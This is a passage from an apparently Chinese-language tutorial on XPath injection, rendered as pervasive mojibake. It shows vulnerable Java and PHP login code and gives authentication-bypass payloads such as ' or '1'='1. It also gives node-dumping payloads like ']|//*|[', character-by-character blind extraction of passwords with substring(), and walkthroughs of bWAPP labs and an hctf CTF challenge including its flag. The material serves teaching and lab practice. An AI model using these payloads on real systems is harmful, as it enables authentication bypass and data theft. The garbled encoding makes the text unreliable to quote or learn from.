ï¼Œä¹Ÿè®¸è¿˜æœ‰ä¸€äº›å…¶ä»–ä¿¡æ¯ï¼Œæ¯”å¦‚è§’è‰²ã€‚ä» users è¡¨ä¸­æ£€ç´¢ç”¨æˆ·çš„ SQL æŸ¥è¯¢å¯èƒ½ç±»ä¼¼äºæ¸…å• 1ã€‚ æ¸…å• 1ä» users è¡¨ä¸­æ£€ç´¢ç”¨æˆ·çš„ SQL æŸ¥è¯¢ Select * from users where loginID=â€™fooâ€™ and password=â€™barâ€™ åœ¨è¿™ä¸ªæŸ¥è¯¢ä¸­ï¼Œç”¨æˆ·å¿…é¡»æä¾› loginID å’Œ password ä½œä¸ºè¾“å…¥ã€‚ å¦‚æœæ”»å‡»è€…åœ¨ loginID å­—æ®µä¸­è¾“å…¥ï¼šâ€™ or 1=1 ,å¹¶åœ¨ password ä¸­è¾“å…¥ï¼šâ€™ or 1=1 åˆ™å½¢æˆçš„æŸ¥è¯¢å°†ç±»ä¼¼æ¸…å• 2ã€‚ æ¸…å• 2. ä»æ”»å‡»è€…è¾“å…¥å½¢æˆçš„æŸ¥è¯¢ Select * from users where loginID = â€™â€™ or 1=1 and password=â€™ â€™ or 1=1 è¿™ä¸ªæ¡ä»¶ä¼šä¸€ç›´åŒ¹é…ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥è¿›å…¥ç³»ç»Ÿã€‚ XPath æ³¨å…¥çš„åŸç†å¤§ä½“ç±»ä¼¼ã€‚ä½†æ˜¯ï¼Œå‡è®¾æ‚¨æ‹¥æœ‰çš„ä¸æ˜¯ä¸€ä¸ª users è¡¨ï¼Œè€Œæ˜¯ä¸€ä¸ª XML æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†å¦‚æ¸…å• 3 æ‰€ç¤ºçš„ç”¨æˆ·ä¿¡æ¯ã€‚ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Jeghis&lt;/firstname&gt; &lt;lastname&gt;Katz&lt;/lastname&gt; &lt;loginID&gt;mrj&lt;/loginID&gt; &lt;password&gt;jk2468&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Darien&lt;/firstname&gt; &lt;lastname&gt;Heap&lt;/lastname&gt; &lt;loginID&gt;drano&lt;/loginID&gt; &lt;password&gt;2mne8s&lt;/password&gt; &lt;/user&gt; &lt;/users&gt; åœ¨ XPath ä¸­ï¼Œç±»ä¼¼äº SQL æŸ¥è¯¢çš„è¯­å¥å¦‚æ¸…å• 4 æ‰€ç¤ºã€‚ æ¸…å• 4. åŒ¹é… SQL æŸ¥è¯¢çš„ XPath è¯­å¥ //users/user[loginID/text()=â€™abcâ€™ and password/text()=â€™test123â€™] è¦æ‰§è¡Œç±»ä¼¼çš„æ”»å‡»ä»¥ç»•è¿‡èº«ä»½éªŒè¯ï¼Œå¦‚æœæ”»å‡»è€…åœ¨ loginID å­—æ®µä¸­è¾“å…¥ï¼šâ€™ or 1=1 å¹¶åœ¨ password ä¸­è¾“å…¥ï¼šâ€™ or 1=1 æ‚¨å¯èƒ½ä¼šä½¿ç”¨ç±»ä¼¼æ¸…å• 5 çš„æ–¹æ³•ã€‚ æ¸…å• 5. ç»•è¿‡èº«ä»½éªŒè¯ //users/user[LoginID/text()=â€™â€™ or 1=1 and password/text()=â€™â€™ or 1=1] æ‚¨å¯èƒ½åœ¨ Java åº”ç”¨ç¨‹åºä¸­æœ‰ä¸€ä¸ªè¯¸å¦‚ doLogin ä¹‹ç±»çš„æ–¹æ³•ï¼Œä½¿ç”¨æ¸…å• 3 ä¸­çš„ XML æ–‡æ¡£å†æ¬¡æ‰§è¡Œèº«ä»½éªŒè¯ã€‚å¯èƒ½ç±»ä¼¼äºæ¸…å• 6ã€‚ æ¸…å• 6. XPathInjection.java import java.io.IOException; import org.w3c.dom.*; import org.xml.sax.SAXException; import javax.xml.parsers.*; import javax.xml.xpath.*; public class XpathInjectionExample { public boolean doLogin(String loginID, String password) throws ParserConfigurationException, SAXException,IOException, XPathExpressionException { DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance(); domFactory.setNamespaceAware(true); DocumentBuilder builder = domFactory.newDocumentBuilder(); Document doc = builder.parse(\"users.xml\"); XPathFactory factory = XPathFactory.newInstance(); XPath xpath = factory.newXPath(); XPathExpression expr = xpath.compile(\"//users/user[loginID/text()=â€™\"+loginID+\"â€™ and password/text()=â€™\"+password+\"â€™ ]/firstname/text()\"); Object result = expr.evaluate(doc, XPathConstants.NODESET); NodeList nodes = (NodeList) result; //print first names to the console for (int i = 0; i &lt; nodes.getLength(); i++) { System.out.println(nodes.item(i).getNodeValue()); } if (nodes.getLength() &gt;= 1) { return true; }else{ return false; } } } 0x09 xpathä¹‹bwappå®ä¾‹ä¸€ æˆ‘ä»¬æ¥çœ‹çœ‹bwappä¸Šçš„ç¬¬ä¸€ä¸ªxpathæ³¨å…¥ è¿™ä¸ªç™»å½•ç•Œé¢è®¿é—®æƒé™æ˜¯é€šè¿‡xpathå»è¯»å–xmlæ–‡ä»¶æ¥å®ç°çš„ã€‚æ¢å¥è¯è¯´ï¼Œä½ è¾“å…¥è´¦å·å¯†ç ï¼Œä»–å°±æŠŠxmlæ–‡ä»¶é‡Œçš„åˆæ³•è´¦å·å¯†ç æ‹¿å‡ºæ¥å’Œä½ å¡«å†™çš„è¿›è¡Œæ¯”å¯¹ï¼Œå¦‚æœä¸€è‡´å°±é€šè¿‡ã€‚å¦‚æœä»–å¯¹è¾“å…¥æ²¡æœ‰è¿›è¡Œè¿‡æ»¤çš„è¯ç”¨sqlæ³¨å…¥çš„ä¸‡èƒ½é’¥åŒ™æ˜¯èƒ½é€šè¿‡çš„ï¼ é€šè¿‡è¿™ä¸ªæˆ‘ä»¬äº†è§£åˆ°ï¼Œxpathå’Œsqlæ³¨å…¥è¿˜æ˜¯æœ‰ç‚¹åƒçš„ï¼Œèµ·ç orèƒ½ç”¨ã€‚ è¿›é˜¶æ¢ç´¢ çœ‹ä¸€é“xpathæ³¨å…¥çš„ctfé¢˜ç›®ï¼š åœ¨cookieä¸­æ‰¾åˆ°æç¤ºä¿¡æ¯:æ„æ€æ˜¯sqliä¸æ˜¯å”¯ä¸€çš„æ³¨å…¥-&gt;å› æ­¤æˆ‘ä»¬æƒ³åˆ°Xpathæ³¨å…¥ ç”¨ user1â€™ or â€˜â€™=â€™è¿™æ ·çˆ†å‡ºæ‰€æœ‰useræŸ¥è¯¢ç»“æœï¼Œå¹¶ä¸èƒ½æ‰¾åˆ°flagï¼Œçœ‹æ¥åªèƒ½æ‹¿å‡ºxpathç‰¹æœ‰çš„æ³¨å…¥æ‰‹æ®µäº†ï¼ˆè¿™ä¹Ÿæ˜¯å’Œsqlæ³¨å…¥æœ€å¤§çš„åŒºåˆ†ï¼‰ç›´æ¥çœ‹expï¼šxmltest.php?user=user1â€™] | //* | //*[â€™ å¥½äº†ï¼Œè¿™ä¸€éƒ¨åˆ†åªéœ€è¦äº†è§£xpathæ³¨å…¥å’Œsqlæ³¨å…¥ä¸æ˜¯ä¸€ä¸ªä¸œè¥¿å°±è¡Œã€‚ 0x10 XPathä¹‹bwappå®ä¾‹äºŒ å†æ¥çœ‹çœ‹bwappçš„ç¬¬äºŒä¸ªxpathæ³¨å…¥ è¿™ä¸ªwebåº”ç”¨æ˜¯ï¼Œä½ ç»™å‡ºç±»å‹ï¼Œä»–æŸ¥æ‰¾è¿™ä¸ªç±»å‹çš„ç”µå½±ï¼Œç»™ä½ å‘ˆç°å‡ºæ¥ã€‚è¿™é‡Œæˆ‘é€‰äº†actionåŠ¨ä½œç‰‡ï¼Œä»–å‘Šè¯‰æˆ‘å›¾ä¸­ç»“æœã€‚çœ‹urlå°±çŸ¥é“ï¼Œè¿™é‡Œæ˜¯é€šè¿‡getæ¥ä¼ å‚çš„ã€‚ç®€å•æµ‹è¯•ä¸‹ï¼š è¯­å¥ï¼šgenre=actionâ€™ and â€˜â€™=â€˜&amp;action=searchæ²¡æœ‰å›æ˜¾ï¼Œï¼ˆæ­£å¸¸åº”è¯¥æœ‰å›æ˜¾ï¼‰çœ‹æ ·å­æ˜¯æ¥æ”¶å‚æ•°çš„ä½ç½®é—®é¢˜ï¼Œä¸æ˜¯ä»»ä½•ä½ç½®éƒ½å¯ä»¥æ¥å—and orï¼ˆæ¯”å¦‚åœ¨å‡½æ•°é‡Œï¼‰é‚£æˆ‘ä»¬è¯•è¯•ï¼šgenre=actionâ€™ | //* | â€™ &amp;action=search ç»§ç»­ï¼šgenre=actionâ€™] | //* | //*[â€™ &amp;action=search è¿˜æ˜¯ä¸è¡Œï¼Œä¸è¦ç°å¿ƒï¼Œæ‹¼å­—æ¸¸æˆå°±æ˜¯å¦‚æ­¤ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ï¼š//peo[@name=â€˜{$user}â€™]/subject[contains(foo, â€˜chineseâ€™)]/score è¿™æ˜¯ä¹‹å‰æŸ¥åˆ†æ•°çš„XPathï¼Œè¿™é‡Œæ¥æ”¶å‚æ•°çš„ä½ç½®æ˜¯åœ¨ä¸­æ‹¬å·é‡Œé¢ï¼Œç”¨æ¥æŒ‘é€‰æŸä¸ªèŠ‚ç‚¹å±æ€§ï¼Œå› æ­¤ç”¨ä¸­æ‹¬å·é—­åˆæˆåŠŸï¼Œè¿™é‡Œä¸è¡Œä¼šä¸ä¼šæ˜¯å“ªä¸ªå‡½æ•°é‡Œé¢æ¥æ”¶å‚æ•°ï¼Ÿé‚£å°±æ˜¯æ‹¬å·ï¼ æŠŠä¸­æ‹¬å·æ¢æˆåœ†æ‹¬å·ä¹Ÿä¸è¡Œã€‚å°±åœ¨æˆ‘éƒé—·çš„æ—¶å€™ï¼Œä¸€æ‹è„‘è¢‹ï¼Œå‡½æ•°ä¸€èˆ¬æ˜¯æ”¾åœ¨ä¸­æ‹¬å·é‡Œï¼Œç”¨æ¥å¢åŠ æŸ¥è¯¢æ¡ä»¶çš„ï¼Œè¿™æœ‰ç‚¹åƒwhere é‚£ä¹ˆè¯•è¯•ï¼šgenre=actionâ€™)] | //* | //*[(â€™ &amp;action=search è¿™é‡Œå¯¹è¿™ä¸ªpayloadçš„ç†è§£: ç¬¬ä¸€ä¸ª|å‰é¢å•¥ä¹ŸæŸ¥ä¸åˆ°,å› æ­¤è½¬åˆ°ä¸­é—´çš„è¯­å¥,è¿”å›//* (æ–‡æ¡£ä¸­æ‰€æœ‰å…ƒç´ ),æ¥ç€åˆæŸ¥è¯¢ç¬¬ä¸‰ä¸ª,è™½ç„¶searchæŸ¥ä¸åˆ°,ä½†å‰é¢æœ‰ //* å³://*[(â€˜â€™)]/movie,è¿”å›æ–‡æ¡£ä¸­æ‰€æœ‰movieå…ƒç´  0x11 xpathæŒ–æ˜åˆ©ç”¨ å¦‚æœä¸€ä¸ªç½‘ç«™æŸåº”ç”¨ç¨‹åºå°†æ•°æ®ä¿å­˜åœ¨XMLä¸­ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšé™åˆ¶ï¼Œæ”»å‡»è€…æäº¤äº†æ²¡æœ‰ç»è¿‡å¤„ç†çš„è¾“å…¥ï¼Œå°±æ’å…¥åˆ° XPath æŸ¥è¯¢ä¸­ï¼Œå³äº§ç”ŸXpathæ³¨å…¥ï¼Œé‚£ä¹ˆå°±æ”»å‡»è€…å°±å¯èƒ½é€šè¿‡æ§åˆ¶æŸ¥è¯¢ï¼Œè·å–æ•°æ®ï¼Œæˆ–è€…åˆ é™¤æ•°æ®ä¹‹ç±»çš„æ“ä½œã€‚ Xpathæ˜¯xmlè·¯å¾„è¯­è¨€ï¼Œç”¨äºé…ç½®æ–‡ä»¶çš„æŸ¥æ‰¾ã€‚æ•°æ®åº“å°±æ˜¯xmlæ–‡ä»¶ã€‚å› æ­¤åªè¦æ˜¯åˆ©ç”¨XPathè¯­æ³•çš„Web åº”ç”¨ç¨‹åºå¦‚æœæœªå¯¹è¾“å…¥çš„XPathæŸ¥è¯¢åšä¸¥æ ¼çš„å¤„ç†éƒ½ä¼šå­˜åœ¨XPathæ³¨å…¥æ¼æ´ã€‚æ¯”å¦‚ä¸€äº›ç™»å½•åœ°å€é¡µé¢ï¼Œæœç´¢é¡µé¢éœ€è¦ä¸xmläº¤äº’çš„ä½ç½®ã€‚ åˆ¤æ–­ä¾æ®ï¼šä¸»è¦æ ¹æ®é”™è¯¯ä¿¡æ¯é¡µé¢åˆ¤æ–­ä»¥åŠæŸ¥çœ‹æºç è¿›è¡Œåˆ†æã€‚ Exampleï¼šBwapp é¦–å…ˆè¿™æ˜¯è¿™ä¸ªGetæ–¹å¼è¯·æ±‚éªŒè¯ï¼Œå› æ­¤å¯¹getçš„å‚æ•°è¿›è¡Œæ³¨å…¥æµ‹è¯•ï¼Œå‘ç°æŠ¥é”™ä¿¡æ¯ï¼Œè¯´æ˜æ˜¯å¯èƒ½é€šè¿‡xmlå­˜å‚¨äºå‰ç«¯äº¤äº’ã€‚ ç„¶åæ„é€ xpathæŸ¥è¯¢è¯­å¥//users/user[loginID/text()=â€˜â€™ and password/text()=â€˜â€™],å› æ­¤â€™or 1=1 or â€˜â€™=â€˜æˆ–è€…â€™ or â€˜1â€™='1ç­‰ä½¿å…¶ä¸ºçœŸå¯ä»¥ã€‚ Example:hctf index.html &lt;?php $re = array('and','or','count','select','from','union','group','by','limit','insert','where','order','alter','delete','having','max','min','avg','sum','sqrt','rand','concat','sleep'); setcookie('injection','c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=',time()+100000); if(file_exists('t3stt3st.xml')) { $xml = simplexml_load_file('t3stt3st.xml'); $user=$_GET['user']; $user=str_replace($re, ' ', $user); // $user=str_replace(\"'\", \"&amp;apos\", $user); $query=\"user/username[@name='\".$user.\"']\"; $ans = $xml-&gt;xpath($query); foreach($ans as $x =&gt; $x_value) { echo $x.\": \" . $x_value; echo \"&lt;br /&gt;\"; } } ?&gt; t3stt3et.xml &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;root1&gt; &lt;user&gt; &lt;username name='user1'&gt;user1&lt;/username&gt; &lt;key&gt;KEY:1&lt;/key&gt; &lt;username name='user2'&gt;user2&lt;/username&gt; &lt;key&gt;KEY:2&lt;/key&gt; &lt;username name='user3'&gt;user3&lt;/username&gt; &lt;key&gt;KEY:3&lt;/key&gt; &lt;username name='user4'&gt;user4&lt;/username&gt; &lt;key&gt;KEY:4&lt;/key&gt; &lt;username name='user5'&gt;user5&lt;/username&gt; &lt;key&gt;KEY:5&lt;/key&gt; &lt;username name='user6'&gt;user6&lt;/username&gt; &lt;key&gt;KEY:6&lt;/key&gt; &lt;username name='user7'&gt;user7&lt;/username&gt; &lt;key&gt;KEY:7&lt;/key&gt; &lt;username name='user8'&gt;user8&lt;/username&gt; &lt;key&gt;KEY:8&lt;/key&gt; &lt;username name='user9'&gt;user9&lt;/username&gt; &lt;key&gt;KEY:9&lt;/key&gt; &lt;/user&gt; &lt;hctfadmin&gt; &lt;username name='hctf1'&gt;hctf&lt;/username&gt; &lt;key&gt;flag:hctf{Dd0g_fac3_t0_k3yboard233}&lt;/key&gt; &lt;/hctfadmin&gt; &lt;/root1&gt; é€šè¿‡æŸ¥çœ‹æºç $queryï¼Œç„¶åæ„é€ payload: ']|//*|[' å›æ˜¾å‡ºflag 0x12æµ…è°ˆXPathæ³¨å…¥æ£€æµ‹æ€è·¯å’Œæ–¹æ³• XMLä¸æ˜¯ä¿å­˜ä¼ä¸šæ•°æ®çš„ï¼Œä½†æ˜¯å¾ˆå¤šæƒ…å†µä¸‹éƒ½ç”¨æ¥ä¿å­˜åº”ç”¨ç¨‹åºé…ç½®æ•°æ®ï¼Œå°å‹åº”ç”¨ç¨‹åºä¹Ÿä¿å­˜ç®€å•ä¿¡æ¯ï¼Œä¾‹å¦‚è§’è‰²æƒé™ç­‰ç­‰,ä¸‹é¢ç»™å‡ºä¸€ä¸ªXMLçš„åˆ—å­ &lt;addressBooke&gt; &lt;address&gt; &lt;name&gt;Tom&lt;/name&gt; &lt;password&gt;abcdefg&lt;/password&gt; &lt;age&gt;20&lt;/age&gt; &lt;phone&gt;13000000000&lt;/phone&gt; &lt;/address&gt; &lt;address&gt; &lt;name&gt;Bob&lt;/name&gt; &lt;password&gt;abcdefg&lt;/password&gt; &lt;age&gt;30&lt;/age&gt; &lt;phone&gt;13000000001&lt;/phone&gt; &lt;/address&gt; &lt;address&gt; &lt;name&gt;Jack&lt;/name&gt; &lt;password&gt;abcdefg&lt;/password&gt; &lt;age&gt;40&lt;/age&gt; &lt;phone&gt;13000000002&lt;/phone&gt; &lt;/address&gt; åŸç†ç±»ä¼¼SQLæ³¨å…¥ï¼Œæ„å»ºæ–°çš„æŸ¥è¯¢é€»è¾‘æ¥è¿›è¡Œæ”»å‡»,ä½†æ˜¯è¦æ³¨æ„ï¼Œå…³é”®è¯åƒå‡½æ•°è¿™ç§çš„åŒºåˆ†å¤§å°å†™ 1.æ„å»ºæ–°çš„é€»è¾‘å®ç°æ³¨å…¥ or 1=1 and 1=2 'or 'a'='a 'and 'a'='b ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„æå–å‡ºä¿¡æ¯: 'or //address[name/text()='Tom' and substring(password/text(),1,1)ï¼‰] ='a' and 'a'='a è¿”å›æ­£å¸¸åˆ™åˆ¤æ–­æ­£ç¡®ï¼Œç­‰åŒäºä¸‹é¢çš„æŸ¥è¯¢ï¼š //address[name/text()='' or //address[name/text()='Tom' and substring(password/text(),1,1)ï¼‰] ='a' ]and 'a'='a]/phone/text() é€šè¿‡æŸ¥è¯¢åå­—çš„è¾“å…¥ å´æŸ¥è¯¢åˆ°äº†äº†tomçš„å¯†ç é¦–ä½ï¼Œå°è¯•æ”»å‡»æ¯ä¸€ä¸ªå­—ç¬¦ä½ç½®å¹¶æµ‹è¯•æ¯ä¸€ä¸ªå¯èƒ½çš„å€¼ï¼Œè·å¾—å¯†ç  2.å½“ç„¶äº†å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸èƒ½å¤ŸçŸ¥é“ä»»ä½•èŠ‚ç‚¹çš„åç§°æˆ–è€…è¯´åªèƒ½çŸ¥é“ä¸€éƒ¨åˆ†ï¼Œå¯ä½¿ç”¨ç›²æ³¨XPath ç›¸å½“äºSQLç›²æ³¨ï¼ˆå¤§å®¶éƒ½å¯¹è¯­å¥å«©ç†Ÿäºå¿ƒï¼Œä¸å¤šæäº†ï¼‰ é¦–å…ˆæå–çˆ¶èŠ‚ç‚¹çš„åå­—ï¼š 'or substring(name(parent::*[position()=1]),1,1)='a æ­£å¸¸ 'or substring(name(parent::*[position()=1]),2,1)='d æ­£å¸¸ ........ çˆ¶èŠ‚ç‚¹åå­—ä¸ºaddress æ˜¯å…ƒç´ èŠ‚ç‚¹ æå–å­èŠ‚ç‚¹åå­— 'or substring(//address[1]/*[2],1,1)='p' or 'a'='a æ­£å¸¸ 'or substring(//address[1]/*[2],2,1)='a' or 'a'='a æ­£å¸¸ ........ äºŒå·å­èŠ‚ç‚¹åç§°ä¸ºpassword æå–å­èŠ‚ç‚¹çš„å€¼ï¼š åŸºäºåŸç†ï¼š//address[1]/*[2]/text() -&gt; tomçš„password ä½†æ˜¯è¿™ä¸ªä¸ä¼šè¾“å‡º æˆ‘ä»¬é€šè¿‡å¸ƒå°”å‹æ¥æŸ¥è¯¢XMLæ‰€æœ‰çš„å†…å®¹ 'or substring(//address[1]/*[2]/text(),1,1)='a' or'a'='a æ­£å¸¸ 'or substring(//address[1]/*[2]/text(),1,1)='b' or'a'='a æ­£å¸¸ ...... ç¬¬äºŒä¸ªå­èŠ‚ç‚¹å€¼ä¸ºabcdefg æµ‹è¯•æ­¥éª¤ï¼š æäº¤è¿™äº›çœ‹èƒ½å¦ä½¿å¾—çŠ¶æ€æ”¹å˜ ï¼ˆcountè¿”å›å­èŠ‚ç‚¹æ•°é‡ï¼‰ ' or count(parent::*[position()=1])=0 or 'a'='b çŠ¶æ€1 ' or count(aprent::*[position()=1])&gt;0 or 'a'='b çŠ¶æ€æ”¹å˜ æ•°å­—å‹å‚æ•°ï¼š 1 or count(parent::*[position()=1])=0 1 or count(parent::*[position()=1])=0 çŠ¶æ€æ”¹å˜ ç¡®å®šäº†å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œç”¨ä¸Šé¢çš„æ–¹æ³•æ³¨å…¥å°±å¯ä»¥äº†ï¼ 0x13 ç»å…¸xpathæºç  index.phpï¼š &lt;?php $re = array('and','or','count','select','from','union','group','by','limit','insert','where','order','alter','delete','having','max','min','avg','sum','sqrt','rand','concat','sleep'); setcookie('injection','c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=',time()+100000); if(file_exists('t3stt3st.xml')) { $xml = simplexml_load_file('t3stt3st.xml'); $user=$_GET['user']; $user=str_replace($re, ' ', $user); // $user=str_replace(\"'\", \"&amp;apos\", $user); $query=\"user/username[@name='\".$user.\"']\"; $ans = $xml-&gt;xpath($query); foreach($ans as $x =&gt; $x_value) { echo $x.\": \" . $x_value; echo \"&lt;br /&gt;\"; } } ?&gt; //t3stt3st.xml &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;root1&gt; &lt;user&gt; &lt;username name='user1'&gt;user1&lt;/username&gt; &lt;key&gt;KEY:1&lt;/key&gt; &lt;username name='user2'&gt;user2&lt;/username&gt; &lt;key&gt;KEY:2&lt;/key&gt; &lt;username name='user3'&gt;user3&lt;/username&gt; &lt;key&gt;KEY:3&lt;/key&gt; &lt;username name='user4'&gt;user4&lt;/username&gt; &lt;key&gt;KEY:4&lt;/key&gt; &lt;username name='user5'&gt;user5&lt;/username&gt; &lt;key&gt;KEY:5&lt;/key&gt; &lt;username name='user6'&gt;user6&lt;/username&gt; &lt;key&gt;KEY:6&lt;/key&gt; &lt;username name='user7'&gt;user7&lt;/username&gt; &lt;key&gt;KEY:7&lt;/key&gt; &lt;username name='user8'&gt;user8&lt;/username&gt; &lt;key&gt;KEY:8&lt;/key&gt; &lt;username name='user9'&gt;user9&lt;/username&gt; &lt;key&gt;KEY:9&lt;/key&gt; &lt;/user&gt; &lt;hctfadmin&gt; &lt;username name='hctf1'&gt;hctf&lt;/username&gt; &lt;key&gt;flag:hctf{Dd0g_fac3_t0_k3yboard233}&lt;/key&gt; &lt;/hctfadmin&gt; &lt;/root1&gt; ä»index.phpæºç å¯çŸ¥XPathæŸ¥è¯¢è¯­å¥ä¸º$query=â€œuser/username[@name='â€.$user.â€œ']â€ï¼Œ ä¸”$userç»è¿‡å…³é”®å­—æ›¿æ¢ã€‚ä½†æ˜¯é»‘åå•$reä¸­éƒ½ä¸ºSQLå…³é”®å­—ï¼Œæ‰€ä»¥å¹¶ä¸å½±å“å¯¹XPathè¿›è¡Œæ³¨å…¥ã€‚æˆ‘ä»¬å¯ä»¥æ„é€ payloadå¦‚ ']|//*|zzz['æ¥è¿›è¡Œæ³¨å…¥ï¼Œè·å–æ–‡æ¡£ä¸­çš„æ‰€æœ‰å…ƒç´ èŠ‚ç‚¹ã€‚ 0x14 xpathå±å®³ åœ¨URLåŠè¡¨å•ä¸­æäº¤æ¶æ„XPathä»£ç ï¼Œå¯è·å–åˆ°æƒé™é™åˆ¶æ•°æ®çš„è®¿é—®æƒï¼Œå¹¶å¯ä¿®æ”¹è¿™äº›æ•°æ®ï¼› å¯é€šè¿‡æ­¤ç±»æ¼æ´æŸ¥è¯¢è·å–åˆ°ç³»ç»Ÿå†…éƒ¨å®Œæ•´çš„XMLæ–‡æ¡£å†…å®¹ã€‚ é€»è¾‘ä»¥åŠè®¤è¯è¢«ç»•è¿‡ï¼Œå®ƒä¸åƒæ•°æ®åº“é‚£æ ·æœ‰å„ç§æƒé™ï¼Œxmlæ²¡æœ‰å„ç§æƒé™çš„æ¦‚å¿µ,æ­£å› ä¸ºæ²¡æœ‰æƒé™æ¦‚å¿µï¼Œå› æ­¤åˆ©ç”¨xpathæ„é€ æŸ¥è¯¢çš„æ—¶å€™æ•´ä¸ªæ•°æ®åº“éƒ½ä¼šè¢«ç”¨æˆ·è¯»å–ã€‚ xpathçš„å…·ä½“å±å®³ï¼š ä¸‹é¢æˆ‘å°†ä»è¿™ä¸¤ä¸ªæ–¹é¢æ¥åˆ†åˆ«æ¼”ç¤ºè¿™ä¸¤ç§å±å®³ã€‚ ï¼ˆ1ï¼‰ç»•è¿‡éªŒè¯ é¦–å…ˆè¿™é‡Œæœ‰ä¸€ä¸ªç™»å½•èº«ä»½éªŒè¯çš„ç¨‹åºï¼Œæ‰€æœ‰çš„èº«ä»½æ•°æ®éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º UsersDataBase.xml çš„æ–‡ä»¶é‡Œã€‚ é€šè¿‡ XPath æŸ¥è¯¢ xml æ–‡ä»¶ï¼Œå°†ç”¨æˆ·æäº¤çš„ç”¨æˆ·åå’Œå¯†ç ä¸ xml æ–‡ä»¶ä¸­çš„ç”¨æˆ·åå¯†ç åšæ¯”å¯¹æ¥éªŒè¯èº«ä»½ã€‚ UsersDataBase.xml çš„ç»“æ„å¦‚ä¸‹ï¼š ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¾“å…¥é”™è¯¯çš„ç”¨æˆ·åæˆ–å¯†ç ä¼šå¯¼è‡´èº«ä»½è®¤è¯å¤±è´¥ï¼š ç„¶è€Œåœ¨åå°çš„èº«ä»½è®¤è¯ç¨‹åºä¸­æœ‰è¿™æ ·ä¸€å¥ XPath æŸ¥è¯¢è¯­å¥ $xpath = â€œ//users/user[username/text()='â€.$_POST[â€œusernameâ€].â€œâ€™ and password/text()='â€.$_POST[â€œpasswordâ€].â€œ']â€; å¯ä»¥çœ‹åˆ°åœ¨ XPath æŸ¥è¯¢è¯­å¥ä¸­å¹¶æœªå¯¹ç”¨æˆ·çš„è¾“å…¥åšä»»ä½•å¤„ç†ï¼Œè¿™å°±ç›´æ¥å¯¼è‡´ä¸€ä¸ªæ³¨å…¥ç‚¹ æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹çš„ payload: Username: â€™ or â€˜1â€™ = '1 Password: â€™ or â€˜1â€™ = '1 é‚£ä¹ˆæ•´ä¸ª XPath æŸ¥è¯¢è¯­å¥å°±å˜æˆäº†è¿™ä¸ªæ ·å­ $xpath = â€œ//users/user[username/text()=â€˜â€™ or â€˜1â€™ = â€˜1â€™ and password/text()=â€˜â€™ or â€˜1â€™ = â€˜1â€™]â€; æ•´ä¸ªæŸ¥è¯¢è¯­å¥æ’æˆç«‹ï¼Œå°±ç›´æ¥å¯¼è‡´äº†èº«ä»½è®¤è¯è¢«ç»•è¿‡ã€‚ 2.ä¿¡æ¯æ³„éœ² å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå½“æœåŠ¡å™¨è¿”å›æ•°æ®æ—¶ï¼Œéƒ½ä¼šå¯¹è¿™äº›æ•°æ®åšä¸€äº›å¤„ç†ã€‚æ¯”å¦‚å¦‚æœæœåŠ¡å™¨è¿”å›ä¸€äº›é”™è¯¯ä¿¡æ¯ï¼Œé‚£ä¹ˆæœ€ç»ˆä¼šè¢«è¿‡æ»¤æ‰ï¼Œä¸ä¼šå‡ºç°åœ¨ç”¨æˆ·çš„é¡µé¢é‡Œã€‚å°†å°½å¯èƒ½å°‘çš„ä¿¡æ¯æš´éœ²ç»™ç”¨æˆ·ï¼Œå°†å¯ä»¥æé«˜å®‰å…¨æ€§ã€‚ä½†æ˜¯å³ä½¿é”™è¯¯ä¿¡æ¯è¢«è¿‡æ»¤æ‰ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥ä»æœåŠ¡å™¨ç»™å‡ºçš„ä¸åŒè¿”å›ç»“æœæ¨æµ‹å‡ºæœåŠ¡å™¨åšå‡ºäº†ä½•ç§å“åº”ã€‚ä½œä¸ºæ”»å‡»è€…å¯ä»¥æäº¤ä¸€æ®µåŒ…å« XPath å‡½æ•°çš„ Payloadï¼Œé€šè¿‡æœåŠ¡å™¨ç»™å‡ºçš„ä¸åŒå“åº”ï¼Œåˆ¤æ–­å¾—åˆ°æˆ‘ä»¬æƒ³çŸ¥é“çš„ä¿¡æ¯ã€‚è¿™å°±æ˜¯ XPath ç›²æ³¨ã€‚ ä¸‹é¢è¿™æ˜¯ä¸€ä¸ªé€šè¿‡ç”¨æˆ·åçš„IDæ¥å¾—åˆ°ç”¨æˆ·åçš„ç¨‹åºã€‚å½“ç„¶å…·ä½“åœºæ™¯ä¹Ÿå¯èƒ½æ˜¯é€šè¿‡åå­—æ¥æŸ¥è¯¢èº«ä»½è¯å·ç ç­‰ç­‰ï¼Œè¿™é‡Œåªåšæ¼”ç¤ºã€‚ æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¾“å…¥ç”¨æˆ·çš„ 